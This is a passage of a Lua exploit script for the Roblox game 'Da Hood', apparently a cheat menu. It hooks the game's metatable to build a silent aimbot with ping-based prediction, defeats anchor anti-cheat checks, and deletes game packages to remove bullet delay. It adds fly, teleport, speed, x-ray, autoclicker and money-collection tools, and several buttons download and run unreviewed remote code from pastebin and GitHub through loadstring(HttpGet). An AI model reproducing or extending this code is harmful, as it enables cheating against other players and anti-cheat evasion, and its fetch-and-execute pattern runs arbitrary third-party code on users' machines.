                Circle.Filled = Settings.Kalslock.CircleFilled
                Circle.Transparency = Settings.Kalslock.CircleTransparency
                Circle1.Visible = true
                Circle1.Radius = Settings.Kalslock.CircleTransparencyOutline
                Circle1.Position = Vector2.new(mouse.X, mouse.Y + Inset)
                Circle1.Thickness = 5
                Circle1.Color = Settings.Kalslock.OutlineColor

        else
                Circle.Visible = false
                Line.Visible = false
                Text.Visible = false
                Circle1.Visible = false
            placemarker.CFrame = CFrame.new(0, 9999, 0)
        end
        if Settings.Kalslock.pingprediction == true then
             pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
             split = string.split(pingvalue,'(')
             ping = tonumber(split[1])
            if ping < 130 then
                PredictionValue = 0.151
            elseif ping < 125 then
                PredictionValue = 0.149
            elseif ping < 110 then
                PredictionValue = 0.146
            elseif ping < 105 then
                PredictionValue = 0.138
            elseif ping < 90 then
                PredictionValue = 0.136
            elseif ping < 80 then
                PredictionValue = 0.134
            elseif ping < 70 then
                PredictionValue = 0.131
            elseif ping < 60 then
                PredictionValue = 0.1229
            elseif ping < 50 then
                PredictionValue = 0.1225
            elseif ping < 40 then
                PredictionValue = 0.1256
            end
        end
    end)

    local mt = getrawmetatable(game)
    local old = mt.__namecall
    setreadonly(mt, false)
    mt.__namecall = newcclosure(function(...)
        local args = {...}
        if enabled and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" and Settings.Kalslock.Enabled and Plr.Character ~= nil then

            -- args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*accomidationfactor)
            --[[
            if Settings.Kalslock.airshots == true then
                if game.Workspace.Players[Plr.Name].Humanoid:GetState() == Enum.HumanoidStateType.Freefall then -- Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.HumanoidStateType.Freefall
                    
                    --// Airshot
                    args[3] = Plr.Character.LeftFoot.Position+(Plr.Character.LeftFoot.Velocity*PredictionValue)

                else
                    args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*PredictionValue)

                end
            else
    args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*PredictionValue)
    end
    ]]
    if Prediction == true then
                
    args[3] = Plr.Character[SelectedPart].Position+(Plr.Character[SelectedPart].Velocity*PredictionValue)

    else

    args[3] = Plr.Character[SelectedPart].Position

    end

    return old(unpack(args))
    end
    return old(...)
    end)

    game:GetService("RunService").RenderStepped:Connect(function()
        if Settings.Kalslock.RESOVLER == true and Plr.Character ~= nil and enabled and Settings.Kalslock.Enabled then
        if Settings.Kalslock.airshots == true and enabled and Plr.Character ~= nil then
            
        if game.Workspace.Players[Plr.Name].Humanoid:GetState() == Enum.HumanoidStateType.Freefall then -- Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.HumanoidStateType.Freefall
                


        if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
        AnchorCount = AnchorCount + 1
        if AnchorCount >= MaxAnchor then
        Prediction = false
        wait(2)
        AnchorCount = 0;
        end
        else
        Prediction = true
        AnchorCount = 0;
        end

        SelectedPart = "LeftFoot"

        else
                

        if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
        AnchorCount = AnchorCount + 1
        if AnchorCount >= MaxAnchor then
        Prediction = false
        wait(2)
        AnchorCount = 0;
        end
        
        else
        Prediction = true
        AnchorCount = 0;
        end

        SelectedPart = "HumanoidRootPart"

        end
        else

                

        if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
        AnchorCount = AnchorCount + 1
        if AnchorCount >= MaxAnchor then
        Prediction = false
        wait(2)
        AnchorCount = 0;
        end
        else
         Prediction = true
         AnchorCount = 0;
        end
        SelectedPart = "HumanoidRootPart"
        end
        else
        SelectedPart = "HumanoidRootPart"
        end
        end)

        if Settings.Kalslock.NoBulletDelay == true then
            local FuckDelay = game:GetService("CorePackages").Packages
            FuckDelay:Destroy()
        end

        if Settings.Kalslock.Autoclicker == true then
            local time = Settings.Kalslock.AutoclickerTime --decrease if too slow increase if too fast
    
            click = false
            m = game.Players.LocalPlayer:GetMouse()
            m.KeyDown:connect(function(key)
            if key == Settings.Kalslock.AutoclickerKey then
            if click == true then click = false
            elseif
            click == false then click = true
            
            while click == true do 
            wait(time)
            mouse1click()
            end
            end
            end
            end)
        end
        
end)
tool.Parent = game.Players.LocalPlayer.Backpack
end)
local Tab = Window:NewTab("Animation")
local Section = Tab:NewSection("Da Hood Animation")
Section:NewButton("Da Hood Animation Gui", "ButtonInfo", function()
loadstring(game:HttpGet("https://pastebin.com/raw/cC0WCXWt"))()
end)
Section:NewButton("Drooling Zombie Animation With Tool", "ButtonInfo", function()
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "rbxassetid://3489171152"
Animate.idle.Animation2.AnimationId = ""
Animate.walk.WalkAnim.AnimationId = "rbxassetid://3489174223"
Animate.run.RunAnim.AnimationId = "rbxassetid://3489173414"
Animate.jump.JumpAnim.AnimationId = "rbxassetid://616161997"
Animate.climb.ClimbAnim.AnimationId = ""
Animate.fall.FallAnim.AnimationId = ""
game.Players.LocalPlayer.Character.Humanoid.Jump = false

mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Attack"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
plr = game:GetService('Players').LocalPlayer
local anim = Instance.new("Animation")
anim.AnimationId = "rbxassetid://3489169607"

local track = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Animator:LoadAnimation(anim)
track.Looped = false
track:Play()
end)
tool.Parent = game.Players.LocalPlayer.Backpack

end)
local Tab = Window:NewTab("Fun Stuff")
local Section = Tab:NewSection("Fun Stuff")
Section:NewButton("Teleport Tool", "ButtonInfo", function()
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Teleport"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
-- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = "Boombox",
    [2] = "7549600066"
}

game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServer(unpack(args))
wait(1.4)
-- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = "BoomboxStop"
}

game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServer(unpack(args))
end)
tool.Parent = game.Players.LocalPlayer.Backpack
end)
Section:NewTextBox("Flash Tool", "TextboxInfo", function(txt)
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Flash Tool"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
plr = game:GetService('Players').LocalPlayer

        local char = plr.Character

        char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * (txt)
        wait()
        -- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = "Boombox",
    [2] = "9116274241"
}

game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServer(unpack(args))
wait(1.9)
-- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = "BoomboxStop"
}

game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServer(unpack(args))
end)
tool.Parent = game.Players.LocalPlayer.Backpack
end)
Section:NewTextBox("Sonic Tool", "TextboxInfo", function(txt)
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Sonic Tool"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
plr = game:GetService('Players').LocalPlayer

        local char = plr.Character

        char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * (txt)
        wait()
        local anim = Instance.new("Animation")
anim.AnimationId = "rbxassetid://2791328524"

local track = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Animator:LoadAnimation(anim)
track.Looped = false
track:Play()

end)
tool.Parent = game.Players.LocalPlayer.Backpack
end)
Section:NewButton("Inf Jump Tool", "ButtonInfo", function()
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Inf Jump Tool"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
local Players = game:GetService("Players")

local lp = Players.LocalPlayer

local mouse = lp:GetMouse()

local uis = game:GetService("UserInputService")

local rservice = game:GetService("RunService")

local cam = workspace.CurrentCamera

local NormalGravity = game.Workspace.Gravity

local Raw = getrawmetatable(game)

local Caller = checkcaller or is_protosmasher_caller or Cer.isCerus

local CallingScript = getcallingscript or get_calling_script

local Closure = newcclosure or read_me or function(Func) return Func end

local CallingMethod = getnamecallmethod or get_namecall_method

setreadonly(Raw,false)

local NewIndex = Raw.__newindex;

Raw.__newindex = Closure(function(self,Property,Value)

	if Caller() then return NewIndex(self,Property,Value) end

	if Property == "JumpPower" then return 50 end 

	if self == workspace and Property == "Gravity" then return NormalGravity end

	if Property == "CFrame" and self:IsDescendantOf(lp.Character) then return end 

	return NewIndex(self,Property,Value)

end)
-- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = "Boombox",
    [2] = "147722165"
}

game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServer(unpack(args))
wait(1.9)
-- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = "BoomboxStop"
}

game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServer(unpack(args))
end)
tool.Parent = game.Players.LocalPlayer.Backpack
end)
Section:NewButton("Fly Tool", "ButtonInfo", function()
loadstring(game:HttpGet("https://pastebin.com/raw/QNcaJzgv"))()
end)
Section:NewTextBox("Cframe Fly Tool", "TextboxInfo", function(txt)
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Balli Cframe Fly Tool"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
local vim = game:service("VirtualInputManager")
vim:SendKeyEvent(true, "W", false, game)
wait(0.10)
local vim = game:service("VirtualInputManager")
vim:SendKeyEvent(true, "E", false, game)
end)
tool.Parent = game.Players.LocalPlayer.Backpack

local Speed = (txt)


if not RootAnchorBypassed then
    getgenv().RootAnchorBypassed = true
    local Player = game:GetService("Players").LocalPlayer
    local Character = Player.Character or Player.CharacterAdded:Wait()
    local Root = Character:FindFirstChild("HumanoidRootPart")
    Player.CharacterAdded:Connect(function(C)
        Root = C:WaitForChild("HumanoidRootPart")
        wait(0.5)
        for _, C in pairs(getconnections(Root:GetPropertyChangedSignal("Anchored"))) do C:Disable() end
    end)
    
    local GameMT = getrawmetatable(game)
    local __oldindex = GameMT.__index
    setreadonly(GameMT, false)
    GameMT.__index = newcclosure(function(self, Key)
        if self == Root and Key == "Anchored" then return false end
        return __oldindex(self, Key)
    end)
    setreadonly(GameMT, true)
end

local UIS = game:GetService("UserInputService")
local OnRender = game:GetService("RunService").RenderStepped

local Player = game:GetService("Players").LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()

local Camera = workspace.CurrentCamera
local Root = Character:WaitForChild("HumanoidRootPart")

local C1, C2, C3;
local Nav = {Flying = false, Forward = false, Backward = false, Left = false, Right = false}
C1 = UIS.InputBegan:Connect(function(Input)
    if Input.UserInputType == Enum.UserInputType.Keyboard then
        if Input.KeyCode == Enum.KeyCode.E then
            Nav.Flying = not Nav.Flying
            Root.Anchored = Nav.Flying
        elseif Input.KeyCode == Enum.KeyCode.W then
            Nav.Forward = true
        elseif Input.KeyCode == Enum.KeyCode.S then
            Nav.Backward = true
        elseif Input.KeyCode == Enum.KeyCode.A then
            Nav.Left = true
        elseif Input.KeyCode == Enum.KeyCode.D then
            Nav.Right = true
        end
    end
end)

C2 = UIS.InputEnded:Connect(function(Input)
    if Input.UserInputType == Enum.UserInputType.Keyboard then
        if Input.KeyCode == Enum.KeyCode.W then
            Nav.Forward = false
        elseif Input.KeyCode == Enum.KeyCode.S then
            Nav.Backward = false
        elseif Input.KeyCode == Enum.KeyCode.A then
            Nav.Left = false
        elseif Input.KeyCode == Enum.KeyCode.D then
            Nav.Right = false
        end
    end
end)

C3 = Camera:GetPropertyChangedSignal("CFrame"):Connect(function()
    if Nav.Flying then
        Root.CFrame = CFrame.new(Root.CFrame.Position, Root.CFrame.Position + Camera.CFrame.LookVector)
    end
end)

while true do -- not EndAll
    local Delta = OnRender:Wait()
    if Nav.Flying then
        if Nav.Forward then
            Root.CFrame = Root.CFrame + (Camera.CFrame.LookVector * (Delta * Speed))
        end
        if Nav.Backward then
            Root.CFrame = Root.CFrame + (-Camera.CFrame.LookVector * (Delta * Speed))
        end
        if Nav.Left then
            Root.CFrame = Root.CFrame + (-Camera.CFrame.RightVector * (Delta * Speed))
        end
        if Nav.Right then
            Root.CFrame = Root.CFrame + (Camera.CFrame.RightVector * (Delta * Speed))
        end
    end
end
end)

Section:NewButton("Flip Tool", "ButtonInfo", function()
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Flip Tool"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
local vim = game:service("VirtualInputManager")
vim:SendKeyEvent(true, "C", false, game)

end)
tool.Parent = game.Players.LocalPlayer.Backpack

loadstring(game:HttpGet("https://raw.githubusercontent.com/D34THEV1L/DaHoodScripts/main/FrontFlip.lua"))()

end)
Section:NewButton("Katana Knife", "ButtonInfo", function()

   	game.Players.LocalPlayer.Backpack["[Knife]"].GripPos     = Vector3.new(1, 0, 0.1)
				game.Players.LocalPlayer.Backpack["[Knife]"].GripForward     = Vector3.new(0, 0, 0)
				game.Players.LocalPlayer.Backpack["[Knife]"].GripRight     = Vector3.new(0, 0, 0)
				game.Players.LocalPlayer.Backpack["[Knife]"].GripUp     = Vector3.new(-1, 0, 0)
				game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character

				game.Players.LocalPlayer.Backpack["[Knife]"].GripPos     = Vector3.new(2, 0, 0.1)
				game.Players.LocalPlayer.Backpack["[Knife]"].GripForward     = Vector3.new(0, 0, 0)
				game.Players.LocalPlayer.Backpack["[Knife]"].GripRight     = Vector3.new(0, 0, 0)
				game.Players.LocalPlayer.Backpack["[Knife]"].GripUp     = Vector3.new(-1, 0, 0)
				game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character 

				game.Players.LocalPlayer.Backpack["[Knife]"].GripPos     = Vector3.new(3, 0, 0.1)
				game.Players.LocalPlayer.Backpack["[Knife]"].GripForward     = Vector3.new(0, 0, 0)
				game.Players.LocalPlayer.Backpack["[Knife]"].GripRight     = Vector3.new(0, 0, 0)
				game.Players.LocalPlayer.Backpack["[Knife]"].GripUp     = Vector3.new(-1, 0, 0)
				game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character 

				game.Players.LocalPlayer.Backpack["[Knife]"].GripPos     = Vector3.new(4, 0, 0.1)
				game.Players.LocalPlayer.Backpack["[Knife]"].GripForward     = Vector3.new(0, 0, 0)
				game.Players.LocalPlayer.Backpack["[Knife]"].GripRight     = Vector3.new(0, 0, 0)
				game.Players.LocalPlayer.Backpack["[Knife]"].GripUp     = Vector3.new(-1, 0, 0)
				game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character
end)
Section:NewButton("WalkOnWall", "ButtonInfo", function()
loadstring(game:HttpGet("https://pastebin.com/raw/CLqCt4EG"))()
end)
Section:NewButton("Web Tool", "ButtonInfo", function()
local Sound = Instance.new("Sound",game:GetService("SoundService"))
Sound.SoundId = "rbxassetid://1523818134"
Sound:Play()
game:GetService("StarterGui"):SetCore("SendNotification", { 
	Title = ("Thanks For Using DH Balli Gui");
	Text = "Balli Web Tool Loaded!";
	Icon = "rbxthumb://type=Asset&id=9915433572&w=150&h=150"})
Duration = 16;
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Balli Web Tool"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(500,500.500,500)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
local plr=game:service"Players".LocalPlayer;
local tweens=game:service"TweenService";
local mouse=plr:GetMouse();
local info=TweenInfo.new(3,Enum.EasingStyle.Quad); pos=CFrame.new(mouse.Hit.x,mouse.Hit.y,mouse.Hit.z);
   local tween=tweens:Create(plr.Character["HumanoidRootPart"],info,{CFrame=pos});
   tween:Play();
-- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = "Boombox",
    [2] = "1284846268"
}

game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServer(unpack(args))
wait(0.9)
-- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = "BoomboxStop"
}

game:GetService("ReplicatedStorage"):FindFirstChild(".gg/untitledhood"):FireServer(unpack(args))
end)
tool.Parent = game.Players.LocalPlayer.Backpack
end)
Section:NewButton("Freefist Tool", "ButtonInfo", function()
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "FreeFist"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
local vim = game:service("VirtualInputManager")
vim:SendKeyEvent(true, "Q", false, game)
-- // Variables
	local localPlayer       = game:GetService("Players").LocalPlayer
	local localCharacter    = localPlayer.Character
	local Mouse             = localPlayer:GetMouse()
	local FistControl       = false
	local LeftFist          = localCharacter.LeftHand
	local RightFist         = localCharacter.RightHand

	-- // Services
	local uis = game:GetService("UserInputService")

	-- // Coroutine Loop + Functions
	local loopFunction = function()
		LeftFist.CFrame  = CFrame.new(Mouse.Hit.p)
		RightFist.CFrame = CFrame.new(Mouse.Hit.p)
	end

	local Loop

	local Start = function()
		Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction)
	end

	local Pause = function()
		Loop:Disconnect()
	end

	-- // Hotkeys
	uis.InputBegan:connect(function(Key)
		if (Key.KeyCode == Enum.KeyCode.Q) then
			if (FistControl == false) then
				FistControl = true
				Start()
				pcall(function()
					localCharacter.RightHand.RightWrist:Remove()
					localCharacter.LeftHand.LeftWrist:Remove()
				end)
			elseif (FistControl == true) then
				FistControl = false
				Pause()
				local rightwrist  = Instance.new("Motor6D")
				rightwrist.Name   = "RightWrist"
				rightwrist.Parent = localCharacter.RightHand
				rightwrist.C0     = CFrame.new(1.18422506e-07, -0.5009287, -6.81715525e-18, 1, 0, 0, 0, 1, 0, 0, 0, 1)
				rightwrist.C1     = CFrame.new(3.55267503e-07, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1)
				rightwrist.Part0  = localCharacter.RightLowerArm
				rightwrist.Part1  = localCharacter.RightHand

				local leftwrist   = Instance.new("Motor6D")
				leftwrist.Name    = "LeftWrist"
				leftwrist.Parent  = localCharacter.LeftHand
				leftwrist.C0      = CFrame.new(0.000475466368, -0.5009287, 7.59417072e-20, 1, 0, 0, 0, 1, 0, 0, 0, 1)
				leftwrist.C1      = CFrame.new(0.000475821638, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1)
				leftwrist.Part0   = localCharacter.LeftLowerArm
				leftwrist.Part1   = localCharacter.LeftHand
			end
		end
	end)
end)
tool.Parent = game.Players.LocalPlayer.Backpack
end)
Section:NewButton("Hearing Tool", "ButtonInfo", function()
loadstring(game:HttpGet("https://pastebin.com/raw/gYx3WCMM"))()
end)
Section:NewTextBox("Speed Tool", "TextboxInfo", function(txt)
local player = game.Players.LocalPlayer
local character = player.Character
local humanoid = character.Humanoid
 
local tool = Instance.new("Tool")
tool.Name = "Speed Tool"
tool.RequiresHandle = false
tool.Parent = player.Backpack
 
tool. Equipped:Connect(function()
tool:Activate()
_G.loops = true

while _G.loops do
wait()
plr = game:GetService('Players').LocalPlayer

        local char = plr.Character

        char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * (txt)
        wait()
end
end)
tool. Unequipped:Connect(function()
tool:Deactivate()
_G.loops = false

while _G.loops do
wait()
plr = game:GetService('Players').LocalPlayer

        local char = plr.Character

        char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * 17
        wait()
end
end)
end)
Section:NewButton("PP Bat", "Buttoninfo", function()
local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
    local k = game.Workspace.Ignored.Shop["[Bat] - $283"]
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
        wait(.2)
        fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
        toolf = game.Players.LocalPlayer.Backpack:WaitForChild("[Bat]")
        toolf.Parent = game.Players.LocalPlayer.Character
        wait()
        game.Players.LocalPlayer.Character:WaitForChild("[Bat]")
        game.Players.LocalPlayer.Character:WaitForChild("[Bat]").Grip = CFrame.new(-2.4000001, -0.699999988, 0, 0, 1, -0, -1, 0, -0, 0, 0, 1)
        game.Players.LocalPlayer.Character:WaitForChild("[Bat]").GripForward = Vector3.new(0, -1, -0)
        game.Players.LocalPlayer.Character:WaitForChild("[Bat]").GripPos = Vector3.new(1.2111, 1.11114, 1.8111)
        game.Players.LocalPlayer.Character:WaitForChild("[Bat]").GripUp = Vector3.new(-500000, 404, 5000000)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
    end
end)
Section:NewButton("Xray Tool", "ButtonInfo", function()
local player = game.Players.LocalPlayer
local character = player.Character
local humanoid = character.Humanoid
 
local tool = Instance.new("Tool")
tool.Name = "Xray Tool"
tool.RequiresHandle = false
tool.Parent = player.Backpack
 
tool. Equipped:Connect(function()
tool:Activate()
local vim = game:service("VirtualInputManager")
vim:SendKeyEvent(true, "E", false, game)
end)
tool. Unequipped:Connect(function()
tool:Deactivate()
local vim = game:service("VirtualInputManager")
vim:SendKeyEvent(true, "E", false, game)
end)
local xrayHotkey = Enum.KeyCode.E                                                                 

local uis = game:GetService("UserInputService")


local xrayOn = false


uis.InputBegan:Connect(function(inp, processed)
	
	
	if processed then return end
	
	
	if inp.KeyCode == xrayHotkey then
		
		
		xrayOn = not xrayOn
		
		
		for i, descendant in pairs(workspace:GetDescendants()) do
				
			if descendant:IsA("BasePart") then
				
				if xrayOn then
					
					if not descendant:FindFirstChild("OriginalTransparency") then
						
						local originalTransparency = Instance.new("NumberValue")
						originalTransparency.Name = "OriginalTransparency"
						originalTransparency.Value = descendant.Transparency
						originalTransparency.Parent = descendant
					end
					
					descendant.Transparency = 0.5
					
				else
					descendant.Transparency = descendant.OriginalTransparency.Value
				end
			end
		end
	end
end)
end)
Section:NewButton("Cash Aura Tool", "ButtonInfo", function()
for _,v in pairs(workspace.Ignored.Drop:GetChildren()) do
    if v:IsA('Part') and v.Name == "MoneyDrop" then
        v:Destroy() -- destroys the fake/glitched money
    end
end

local player = game.Players.LocalPlayer
local character = player.Character
local humanoid = character.Humanoid
 
local tool = Instance.new("Tool")
tool.Name = "Cash Aura Tool"
tool.RequiresHandle = false
tool.Parent = player.Backpack
 
tool. Equipped:Connect(function()
tool:Activate()
for _,v in pairs(workspace.Ignored.Drop:GetChildren()) do
                if v:IsA('Part') and v.Name == "MoneyDrop" then
                    repeat
                        pcall(function()
                            chr.HumanoidRootPart.CFrame = CFrame.new(v.Position)
                        end)
                        fireclickdetector(v:WaitForChild('ClickDetector'))
                        task.wait()
                    until not v:IsDescendantOf(workspace.Ignored.Drop)
                end
            end
end)
end)
local Tab = Window:NewTab("Visual")
local Section = Tab:NewSection("Visual")
Section:NewButton("Balli Cape", "ButtonInfo", function()
local player = game:GetService("Players")
local lplr = player.LocalPlayer
if lplr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
      if lplr.Character:FindFirstChild("Torso") then
        torso = lplr.Character.Torso
      else
        torso = lplr.Character.UpperTorso
      end
      local CapeP = Instance.new("Part", torso.Parent)
      CapeP.Name = "Cape"
      CapeP.Anchored = false
      CapeP.CanCollide = false
      CapeP.TopSurface = 0
      CapeP.BottomSurface = 0
      CapeP.Color = Color3.fromRGB(0,0,0)
      CapeP.FormFactor = "Custom"
      CapeP.Size = Vector3.new(0.2,0.2,0.2)
      local decal = Instance.new("Decal", CapeP)
      decal.Texture = "http://www.roblox.com/asset/?id=9915433562"
      decal.Face = "Back"
      local msh = Instance.new("BlockMesh", CapeP)
      msh.Scale = Vector3.new(9,17.5,0.5)
      local motor = Instance.new("Motor", CapeP)
      motor.Part0 = CapeP
      motor.Part1 = torso
      motor.MaxVelocity = 0.01
      motor.C0 = CFrame.new(0,1.75,0) * CFrame.Angles(0,math.rad(90),0)
      motor.C1 = CFrame.new(0,1,0.45) * CFrame.Angles(0,math.rad(90),0)
      local wave = false
      repeat wait(1/44)
        decal.Transparency = torso.Transparency
        local ang = 0.1
        local oldmag = torso.Velocity.magnitude
        local mv = 0.002
        if wave then
          ang = ang + ((torso.Velocity.magnitude/10) * 0.05) + 0.05
          wave = false
        else
          wave = true
        end
        ang = ang + math.min(torso.Velocity.magnitude/11, 0.5)
        motor.MaxVelocity = math.min((torso.Velocity.magnitude/111), 0.04) + mv
        motor.DesiredAngle = -ang
        if motor.CurrentAngle < -0.2 and motor.DesiredAngle > -0.2 then
          motor.MaxVelocity = 0.04
        end
        repeat wait() until motor.CurrentAngle == motor.DesiredAngle or math.abs(torso.Velocity.magnitude - oldmag) >= (torso.Velocity.magnitude/10) +
1
        if torso.Velocity.magnitude < 0.1 then
          wait(0.1)
        end
      until not CapeP or CapeP.Parent ~= torso.Parent
    end
end)
Section:NewButton("Visual Korblox", "ButtonInfo", function()
local ply = game.Players.LocalPlayer

        local chr = ply.Character

        chr.RightLowerLeg.MeshId = "902942093"

        chr.RightLowerLeg.Transparency = "1"

        chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"

        chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"

        chr.RightFoot.MeshId = "902942089"

        chr.RightFoot.Transparency = "1"
end)
Section:NewButton("Visual Headless", "ButtonInfo", function()
game.Players.LocalPlayer.Character.Head.Transparency = 1

for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do

if (v:IsA("Decal")) then

v:Destroy()

end

end
end)
Section:NewButton("Visual FullBright", "ButtonInfo", function()
pcall(function()
	local lighting = game:GetService("Lighting");
	lighting.Ambient = Color3.fromRGB(255, 255, 255);
	lighting.Brightness = 1;
	lighting.FogEnd = 1e10;
	for i, v in pairs(lighting:GetDescendants()) do
		if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("SunRaysEffect") then
			v.Enabled = false;
		end;
	end;
	lighting.Changed:Connect(function()
		lighting.Ambient = Color3.fromRGB(255, 255, 255);
		lighting.Brightness = 1;
		lighting.FogEnd = 1e10;
	end);
	spawn(function()
		local character = game:GetService("Players").LocalPlayer.Character;
		while wait() do
			repeat wait() until character ~= nil;
			if not character.HumanoidRootPart:FindFirstChildWhichIsA("PointLight") then
				local headlight = Instance.new("PointLight", character.HumanoidRootPart);
				headlight.Brightness = 1;
				headlight.Range = 60;
			end;
		end;
	end);
end)
end)
Section:NewButton("Visual Building Tool", "ButtonInfo", function()
loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
end)
Section:NewButton("Visual Flashlight Tool", "ButtonInfo", function()
loadstring(game:HttpGet("https://pastebin.com/raw/LSL8cSGb"))()
end)

local Tab = Window:NewTab("Auto Buy")
local Section = Tab:NewSection("This feature works in da hood only")
Section:NewButton("Buy Revolver", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Revolver] - $1339"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Revolver]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Revolver Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["12 [Revolver Ammo] - $77"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Revolver Ammo]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Double-Barrel", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Double-Barrel SG] - $1442"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
